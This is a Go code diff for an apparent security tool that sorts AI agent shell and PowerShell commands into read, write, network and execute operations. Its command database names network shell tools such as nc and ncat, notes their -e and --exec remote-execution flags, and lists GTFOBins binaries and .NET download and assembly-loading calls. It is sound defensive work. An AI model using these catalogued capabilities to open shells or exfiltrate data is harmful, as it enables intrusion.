@@ -14,7 +14,6 @@ import (
 	"os"
 	"path"
 	"regexp"
-	"runtime"
 	"slices"
 	"strconv"
 	"strings"
@@ -22,6 +21,7 @@ import (
 	"time"
 
 	"github.com/BakeLens/crust/internal/pathutil"
+	"github.com/BakeLens/crust/internal/rules/pwsh"
 	"mvdan.cc/sh/v3/expand"
 	"mvdan.cc/sh/v3/interp"
 	"mvdan.cc/sh/v3/syntax"
@@ -29,7 +29,8 @@ import (
 
 // ExtractedInfo contains paths and operation from a tool call
 type ExtractedInfo struct {
-	Operation     Operation
+	Operation     Operation   // highest-priority operation (kept for backward compat)
+	Operations    []Operation // all operations this command performs (deduplicated)
 	Paths         []string
 	Hosts         []string
 	Command       string // Raw command string (for Bash tool)
@@ -38,6 +39,44 @@ type ExtractedInfo struct {
 	RawArgs       map[string]any
 	Evasive       bool   // true if command uses shell tricks that prevent static analysis
 	EvasiveReason string // human-readable reason for evasion detection
+}
+
+// addOperation adds op to info.Operations (deduplicated) and upgrades
+// info.Operation if op has higher priority than the current primary.
+// Use this for dynamic operations derived from arguments (output flags,
+// interpreter code, redirects). For CommandInfo.ExtraOps use appendExtraOp.
+func (info *ExtractedInfo) addOperation(op Operation) {
+	if slices.Contains(info.Operations, op) {
+		return
+	}
+	info.Operations = append(info.Operations, op)
+	if operationPriority(op) > operationPriority(info.Operation) {
+		info.Operation = op
+	}
+}
+
+// appendExtraOp adds op to info.Operations without changing info.Operation.
+// Used for CommandInfo.ExtraOps — the primary operation (info.Operation)
+// reflects the command's typical classification declared in CommandInfo.Operation;
+// ExtraOps are secondary capabilities that matter for rule matching but do not
+// override the primary classification.
+func (info *ExtractedInfo) appendExtraOp(op Operation) {
+	if !slices.Contains(info.Operations, op) {
+		info.Operations = append(info.Operations, op)
+		// Intentionally does NOT update info.Operation
+	}
+}
+
+// forceOperation sets info.Operation regardless of priority and adds op to
+// info.Operations. Use when runtime argument analysis reveals a more specific
+// primary classification than the command's general category — for example,
+// when interpreter -c code reads a file (OpRead overrides OpExecute), or when
+// a WebFetch URL is a file:// path (OpRead overrides OpNetwork).
+func (info *ExtractedInfo) forceOperation(op Operation) {
+	info.Operation = op
+	if !slices.Contains(info.Operations, op) {
+		info.Operations = append(info.Operations, op)
+	}
 }
 
 // normalizeParsedCmdName normalizes a raw command name from the shell AST into
@@ -52,8 +91,9 @@ func normalizeParsedCmdName(name string) string {
 	if name == "[" {
 		return "test"
 	}
-	// .NET static calls arrive as "System.IO.File::ReadAllText" — normalize to
-	// lowercase so commandDB lookups are case-insensitive for .NET names.
+	// .NET static calls: lowercase for case-insensitive DB lookup.
+	// PS cmdlets (Verb-Noun) keep their original case; commandDB lookups
+	// use strings.ToLower(cmdName) so no pre-normalization is needed.
 	if strings.Contains(name, "::") {
 		return strings.ToLower(name)
 	}
@@ -170,12 +210,19 @@ func fieldStrings(val any) []string {
 	return nil
 }
 
+// FindPwsh returns the path to pwsh.exe or powershell.exe, preferring the
+// newer pwsh (PowerShell 7+) over legacy powershell (Windows PowerShell 5.1).
+// This is a package-level convenience wrapper around pwsh.FindPwsh.
+func FindPwsh() (string, bool) {
+	return pwsh.FindPwsh()
+}
+
 // Extractor extracts paths and operations from tool calls
 type Extractor struct {
 	commandDB  map[string]CommandInfo
 	env        map[string]string // process environment for shell expansion
 	worker     *shellWorker      // nil if subprocess isolation is disabled
-	pwshWorker *pwshWorker       // nil on non-Windows or if pwsh not found
+	pwshWorker *pwsh.Worker      // nil on non-Windows or if pwsh not found
 }
 
 // EnableSubprocessIsolation starts a worker subprocess for crash-isolated
@@ -197,7 +244,7 @@ func (e *Extractor) EnableSubprocessIsolation(exePath string) error {
 // site in engine.go is gated behind runtime.GOOS == "windows". Falls back to
 // the heuristic PS transform if this method is not called or returns an error.
 func (e *Extractor) EnablePSWorker(pwshPath string) error {
-	w, err := newPwshWorker(pwshPath)
+	w, err := pwsh.NewWorker(pwshPath)
 	if err != nil {
 		return err
 	}
@@ -212,17 +259,29 @@ func (e *Extractor) Close() {
 		e.worker = nil
 	}
 	if e.pwshWorker != nil {
-		e.pwshWorker.stop()
+		e.pwshWorker.Stop()
 		e.pwshWorker = nil
 	}
 }
 
 // CommandInfo describes how to extract info from a command
 type CommandInfo struct {
-	Operation    Operation
-	PathArgIndex []int    // positional args that are paths
-	PathFlags    []string // flags followed by paths (-o, --output)
-	SkipFlags    []string // flags followed by non-path values (-n, --count)
+	Operation    Operation   // primary (highest-priority) operation
+	ExtraOps     []Operation // additional operations this command can perform
+	PathArgIndex []int       // positional args that are paths
+	PathFlags    []string    // flags followed by paths (-o, --output)
+	SkipFlags    []string    // flags followed by non-path values (-n, --count)
+}
+
+// AllOperations returns all operations for this command (primary + extra).
+func (c CommandInfo) AllOperations() []Operation {
+	if len(c.ExtraOps) == 0 {
+		return []Operation{c.Operation}
+	}
+	ops := make([]Operation, 0, 1+len(c.ExtraOps))
+	ops = append(ops, c.Operation)
+	ops = append(ops, c.ExtraOps...)
+	return ops
 }
 
 // NewExtractor creates a new Extractor with the default command database
@@ -254,7 +313,7 @@ func NewExtractorWithEnv(env map[string]string) *Extractor {
 
 // defaultCommandDB returns the default command database
 func defaultCommandDB() map[string]CommandInfo {
-	return map[string]CommandInfo{
+	db := map[string]CommandInfo{
 		// ===========================================
 		// READ OPERATIONS
 		// ===========================================
@@ -264,10 +323,10 @@ func defaultCommandDB() map[string]CommandInfo {
 		"less": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
 		"more": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
 		"grep": {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5, 6, 7, 8, 9}, SkipFlags: []string{"-e", "--regexp", "-m", "--max-count", "-A", "-B", "-C", "--context"}},
-		"vim":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
-		"vi":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
-		"nano": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
-		"view": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
+		"vim":  {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
+		"vi":   {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
+		"nano": {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
+		"view": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}}, // read-only vi variant
 
 		// Directory listing
 		"ls":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
@@ -294,7 +353,7 @@ func defaultCommandDB() map[string]CommandInfo {
 		// Encoding tools (GTFOBins: file-read)
 		"uuencode": {Operation: OpRead, PathArgIndex: []int{0}},
 		"uudecode": {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-o"}},
-		"iconv":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, SkipFlags: []string{"-f", "--from-code", "-t", "--to-code", "-o", "--output"}},
+		"iconv":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o", "--output"}, SkipFlags: []string{"-f", "--from-code", "-t", "--to-code"}},
 
 		// Hashing/checksum tools (must read file to compute hash)
 		"md5sum":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
@@ -310,11 +369,11 @@ func defaultCommandDB() map[string]CommandInfo {
 		"b2sum":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
 
 		// Text processing (read)
-		"awk":   {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
-		"gawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
-		"mawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
-		"nawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
-		"sed":   {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}}, // -i becomes write but still reads first
+		"awk":   {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}, PathFlags: []string{"-f", "--file"}},
+		"gawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}, PathFlags: []string{"-f", "--file"}},
+		"mawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}, PathFlags: []string{"-f"}},
+		"nawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}, PathFlags: []string{"-f"}},
+		"sed":   {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}, PathFlags: []string{"-f", "--file"}}, // -i becomes write (extractor_commands.go)
 		"cut":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
 		"sort":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
 		"uniq":  {Operation: OpRead, PathArgIndex: []int{0, 1}},
@@ -323,7 +382,7 @@ func defaultCommandDB() map[string]CommandInfo {
 		"sdiff": {Operation: OpRead, PathArgIndex: []int{0, 1}},
 		"diff3": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
 		"cmp":   {Operation: OpRead, PathArgIndex: []int{0, 1}, SkipFlags: []string{"-n", "--bytes"}},
-		"shuf":  {Operation: OpRead, PathArgIndex: []int{0}, SkipFlags: []string{"-i", "-n", "--input-range", "--head-count", "-o", "--output"}},
+		"shuf":  {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-o", "--output"}, SkipFlags: []string{"-i", "-n", "--input-range", "--head-count"}},
 		"split": {Operation: OpRead, PathArgIndex: []int{0}, SkipFlags: []string{"-n", "--number", "-l", "--lines", "-b", "--bytes", "-a", "--suffix-length"}},
 		"tsort": {Operation: OpRead, PathArgIndex: []int{0}},
 
@@ -333,12 +392,12 @@ func defaultCommandDB() map[string]CommandInfo {
 		"rg":    {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5, 6, 7, 8, 9}, SkipFlags: []string{"-e", "--regexp", "-m", "--max-count", "-A", "-B", "-C", "--context", "-t", "--type", "-g", "--glob"}},
 
 		// Editors (GTFOBins: file-read)
-		"ed":    {Operation: OpRead, PathArgIndex: []int{0}},
-		"ex":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
-		"emacs": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
-		"rview": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
-		"rvim":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
-		"pico":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
+		"ed":    {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0}},
+		"ex":    {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2, 3}},
+		"emacs": {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
+		"rview": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}}, // read-only vim variant
+		"rvim":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}}, // restricted vim (no shell/write cmds)
+		"pico":  {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2}},
 
 		// Pagers / display tools
 		"pg":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
@@ -348,7 +407,6 @@ func defaultCommandDB() map[string]CommandInfo {
 
 		// Additional text tools (read)
 		"tac":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
-		"toc":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
 		"rev":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
 		"nl":       {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
 		"paste":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
@@ -383,25 +441,25 @@ func defaultCommandDB() map[string]CommandInfo {
 
 		// Archive tools (read contents)
 		"tar":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-f", "--file"}},
-		"zip":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
-		"unzip":   {Operation: OpRead, PathArgIndex: []int{0}},
-		"gzip":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"gunzip":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
+		"zip":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
+		"unzip":   {Operation: OpWrite, PathArgIndex: []int{0}},
+		"gzip":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
+		"gunzip":  {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2}}, // reads compressed, writes decompressed
 		"zcat":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"bzip2":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"bunzip2": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
+		"bzip2":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
+		"bunzip2": {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2}},
 		"bzcat":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"xz":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
+		"xz":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
 		"xzcat":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"lzma":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"unlzma":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
+		"lzma":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
+		"unlzma":  {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2}},
 		"lzcat":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"zstd":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"unzstd":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
+		"zstd":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
+		"unzstd":  {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1, 2}},
 		"zstdcat": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"lz4":     {Operation: OpRead, PathArgIndex: []int{0, 1}},
+		"lz4":     {Operation: OpWrite, PathArgIndex: []int{0, 1}},
 		"lz4cat":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"unlz4":   {Operation: OpRead, PathArgIndex: []int{0, 1}},
+		"unlz4":   {Operation: OpRead, ExtraOps: []Operation{OpWrite}, PathArgIndex: []int{0, 1}},
 		"cpio":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-F", "--file", "-I", "-E"}},
 		"ar":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
 		"7z":      {Operation: OpRead, PathArgIndex: []int{1, 2, 3}},
@@ -415,7 +473,7 @@ func defaultCommandDB() map[string]CommandInfo {
 		"install":  {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-m", "--mode", "-o", "--owner", "-g", "--group"}},
 		"mkdir":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
 		"sponge":   {Operation: OpWrite, PathArgIndex: []int{0}},
-		"truncate": {Operation: OpWrite, PathArgIndex: []int{0, 1}, SkipFlags: []string{"-s", "--size"}},
+		"truncate": {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-r", "--reference"}, SkipFlags: []string{"-s", "--size"}},
 		"patch":    {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-i", "--input", "-o", "--output"}},
 		"chmod":    {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}}, // arg0 = mode
 		"chown":    {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}}, // arg0 = owner[:group]
@@ -488,14 +546,15 @@ func defaultCommandDB() map[string]CommandInfo {
 		"exiftool":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
 
 		// GTFOBins file-write binaries
-		"gdb":    {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-x", "--command", "--core"}},
+		"gdb":    {Operation: OpExecute, ExtraOps: []Operation{OpRead}, PathArgIndex: []int{0, 1}, PathFlags: []string{"-x", "--command", "--core"}},
+		"lldb":   {Operation: OpExecute, ExtraOps: []Operation{OpRead}, PathArgIndex: []int{0, 1}, PathFlags: []string{"-o", "-s", "-S", "--source", "--one-line"}},
 		"screen": {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-L", "-Logfile"}},
 		"tmux":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
 		"script": {Operation: OpWrite, PathArgIndex: []int{0}},
 
 		// Filesystem metadata modification
 		"chattr":  {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}},
-		"setfacl": {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-m", "--modify", "-M", "--modify-file", "-x", "--remove", "-X", "--remove-file"}},
+		"setfacl": {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, PathFlags: []string{"-M", "--modify-file", "-X", "--remove-file"}, SkipFlags: []string{"-m", "--modify", "-x", "--remove"}},
 		"xattr":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
 		"chflags": {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}},
 
@@ -620,20 +679,20 @@ func defaultCommandDB() map[string]CommandInfo {
 		// ===========================================
 		"curl":           {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-o", "--output"}},
 		"wget":           {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-O", "--output-document", "--post-file", "--body-file"}},
-		"nc":             {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"nc.traditional": {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"nc.openbsd":     {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"netcat":         {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"ssh":            {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"sftp":           {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"ftp":            {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"telnet":         {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"nc":             {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}}, // supports -e for remote code execution
+		"nc.traditional": {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}},
+		"nc.openbsd":     {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}},
+		"netcat":         {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}},
+		"ssh":            {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}},       // executes remote commands
+		"sftp":           {Operation: OpNetwork, ExtraOps: []Operation{OpRead, OpWrite}, PathArgIndex: []int{0}}, // reads/writes remote files
+		"ftp":            {Operation: OpNetwork, ExtraOps: []Operation{OpRead, OpWrite}, PathArgIndex: []int{0}}, // get/put
+		"telnet":         {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}},       // interactive shell access
 		"nmap":           {Operation: OpNetwork, PathArgIndex: []int{0, 1, 2, 3}},
 		"ping":           {Operation: OpNetwork, PathArgIndex: []int{0}},
 		"dig":            {Operation: OpNetwork, PathArgIndex: []int{0}},
 		"nslookup":       {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"socat":          {Operation: OpRead, PathArgIndex: []int{0, 1}}, // can read files (socat - /path) and network
-		"ncat":           {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"socat":          {Operation: OpRead, PathArgIndex: []int{0, 1}},                                   // upgraded to execute/network based on address types in args
+		"ncat":           {Operation: OpNetwork, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}}, // --exec/--sh-exec for remote code execution
 		"aria2c":         {Operation: OpNetwork, PathArgIndex: []int{0}},
 		"http":           {Operation: OpNetwork, PathArgIndex: []int{0, 1, 2}},
 		"whois":          {Operation: OpNetwork, PathArgIndex: []int{0}},
@@ -671,8 +730,8 @@ func defaultCommandDB() map[string]CommandInfo {
 		"Rscript": {Operation: OpExecute, PathArgIndex: []int{0}},
 
 		// Indirect execution
-		"xargs":  {Operation: OpExecute, PathArgIndex: []int{0, 1, 2}},
-		"find":   {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-exec", "-execdir"}},
+		"xargs":  {Operation: OpExecute, PathFlags: []string{"-a", "--arg-file"}},               // arg0 is a command name, not a path
+		"find":   {Operation: OpRead, ExtraOps: []Operation{OpExecute}, PathArgIndex: []int{0}}, // searches dirs (read), may -exec commands
 		"eval":   {Operation: OpExecute, PathArgIndex: []int{0}},
 		"source": {Operation: OpExecute, PathArgIndex: []int{0}},
 		".":      {Operation: OpExecute, PathArgIndex: []int{0}}, // source alias
@@ -752,7 +811,7 @@ func defaultCommandDB() map[string]CommandInfo {
 		"Get-ChildItem":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath", "-Filter"}},
 		"gci":              {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath", "-Filter"}},
 		"dir":              {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
-		"Select-String":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath", "-Pattern"}},
+		"Select-String":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath"}, SkipFlags: []string{"-Pattern"}},
 		"sls":              {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath"}},
 		"Get-ItemProperty": {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
 		"Test-Path":        {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
@@ -767,7 +826,7 @@ func defaultCommandDB() map[string]CommandInfo {
 		"Add-Content":      {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-LiteralPath", "-Value"}},
 		"ac":               {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-LiteralPath"}},
 		"Out-File":         {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-FilePath", "-LiteralPath"}},
-		"New-Item":         {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-Name", "-ItemType"}},
+		"New-Item":         {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-Name"}, SkipFlags: []string{"-ItemType"}},
 		"ni":               {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-Name"}},
 		"Set-ItemProperty": {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
 		"Clear-Content":    {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
@@ -799,12 +858,12 @@ func defaultCommandDB() map[string]CommandInfo {
 		"iwr":                {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
 		"Invoke-RestMethod":  {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
 		"irm":                {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
-		"Send-MailMessage":   {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-To", "-From", "-SmtpServer", "-Attachments"}},
-		"Test-NetConnection": {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-ComputerName", "-Port"}},
+		"Send-MailMessage":   {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Attachments"}, SkipFlags: []string{"-To", "-From", "-SmtpServer"}},
+		"Test-NetConnection": {Operation: OpNetwork, PathArgIndex: []int{0}, SkipFlags: []string{"-ComputerName", "-Port"}},
 		"Resolve-DnsName":    {Operation: OpNetwork, PathArgIndex: []int{0}},
 
 		// Execute operations
-		"Invoke-Expression":      {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-Command"}},
+		"Invoke-Expression":      {Operation: OpExecute, PathArgIndex: []int{0}, SkipFlags: []string{"-Command"}},
 		"iex":                    {Operation: OpExecute, PathArgIndex: []int{0}},
 		"Start-Process":          {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-FilePath", "-ArgumentList"}},
 		"saps":                   {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-FilePath"}},
@@ -849,15 +908,48 @@ func defaultCommandDB() map[string]CommandInfo {
 		"system.net.dns::resolve":          {Operation: OpNetwork, PathArgIndex: []int{0}},
 		// System.Diagnostics.Process
 		"system.diagnostics.process::start": {Operation: OpExecute, PathArgIndex: []int{0}},
+		// System.Reflection.Assembly — dynamic code loading (high-severity)
+		"system.reflection.assembly::loadfile": {Operation: OpExecute, PathArgIndex: []int{0}},
+		"system.reflection.assembly::loadfrom": {Operation: OpExecute, PathArgIndex: []int{0}},
+		"system.reflection.assembly::load":     {Operation: OpExecute, PathArgIndex: []int{0}},
 		// Instance methods via New-Object (keys lowercased, :: separator)
-		"system.net.webclient::downloadfile":    {Operation: OpWrite, PathArgIndex: []int{1}},
-		"system.net.webclient::downloadstring":  {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"system.net.webclient::uploadfile":      {Operation: OpRead, PathArgIndex: []int{1}},
-		"system.net.webclient::uploadstring":    {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"system.net.webclient::openread":        {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"system.net.http.httpclient::getasync":  {Operation: OpNetwork, PathArgIndex: []int{0}},
-		"system.net.http.httpclient::postasync": {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.webclient::downloadfile":   {Operation: OpWrite, PathArgIndex: []int{1}},
+		"system.net.webclient::downloadstring": {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.webclient::uploadfile":     {Operation: OpRead, PathArgIndex: []int{1}},
+		"system.net.webclient::uploadstring":   {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.webclient::openread":       {Operation: OpNetwork, PathArgIndex: []int{0}},
+		// System.Net.WebClient — additional methods
+		"system.net.webclient::uploaddata":   {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.webclient::downloaddata": {Operation: OpNetwork, PathArgIndex: []int{0}},
+		// System.IO stream types
+		"system.io.streamreader": {Operation: OpRead, PathArgIndex: []int{0}},
+		"system.io.streamwriter": {Operation: OpWrite, PathArgIndex: []int{0}},
+		"system.io.filestream":   {Operation: OpRead, PathArgIndex: []int{0}},
+		// Microsoft.Win32.Registry
+		"microsoft.win32.registrykey::opensubkey": {Operation: OpRead, PathArgIndex: []int{0}},
+		"microsoft.win32.registrykey::setvalue":   {Operation: OpWrite, PathArgIndex: []int{0}},
+		"microsoft.win32.registrykey::getvalue":   {Operation: OpRead, PathArgIndex: []int{0}},
+		"microsoft.win32.registry::getvalue":      {Operation: OpRead, PathArgIndex: []int{0}},
+		"microsoft.win32.registry::setvalue":      {Operation: OpWrite, PathArgIndex: []int{0}},
+		// System.Net.Sockets
+		"system.net.sockets.tcpclient::connect":      {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.sockets.tcpclient::connectasync": {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.sockets.udpclient::send":         {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.sockets.udpclient::sendasync":    {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.http.httpclient::getasync":       {Operation: OpNetwork, PathArgIndex: []int{0}},
+		"system.net.http.httpclient::postasync":      {Operation: OpNetwork, PathArgIndex: []int{0}},
 	}
+	// Lowercase all PS cmdlet keys (Verb-Noun → verb-noun) for case-insensitive lookup.
+	// Bash commands are already lowercase; .NET API keys are already lowercase.
+	lc := make(map[string]CommandInfo, len(db))
+	for k, v := range db {
+		if strings.Contains(k, "-") {
+			lc[strings.ToLower(k)] = v
+		} else {
+			lc[k] = v
+		}
+	}
+	return lc
 }
 
 // Extract extracts info from a tool call
@@ -962,6 +1054,12 @@ func (e *Extractor) Extract(toolName string, args json.RawMessage) ExtractedInfo
 	// Catches renamed tools, hidden fields, and MCP tools with standard arg shapes.
 	e.augmentFromArgShape(&info)
 
+	// Ensure Operations is always populated from Operation (for tool extractors
+	// that set info.Operation directly rather than calling addOperation).
+	if info.Operation != OpNone && len(info.Operations) == 0 {
+		info.Operations = []Operation{info.Operation}
+	}
+
 	return info
 }
 
@@ -1008,7 +1106,7 @@ func (e *Extractor) extractBashCommand(info *ExtractedInfo) {
 		// When the pwsh worker is available (Windows), use dual-parse:
 		// bash parser + PS native AST. The heuristic transform (substitutePSVariables
